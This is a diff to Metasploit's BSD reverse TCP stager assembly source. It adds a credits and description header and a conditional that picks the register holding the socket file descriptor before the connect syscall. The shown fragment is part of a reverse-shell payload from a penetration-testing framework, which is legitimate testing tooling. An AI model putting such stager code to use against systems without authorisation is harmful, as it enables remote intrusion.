@@ -1,3 +1,23 @@
+;;
+; 
+;        Name: stager_sock_reverse
+;   Qualities: Can Have Nulls
+;   Platforms: BSD
+;     Authors: skape <mmiller [at] hick.org>
+;     Version: $Revision$
+;     License: 
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Implementation of a BSD reverse TCP stager.
+;
+;        File descriptor in edi.
+;
+;;
 BITS   32
 GLOBAL main
 
@@ -25,6 +45,11 @@ connect:
 	push ecx
 	push eax
 	push ecx
+%ifdef FD_REG_EBX
+	xchg eax, ebx
+%else
+	xchg eax, edi
+%endif
 	push byte 98
 	pop  eax
 	int  0x80
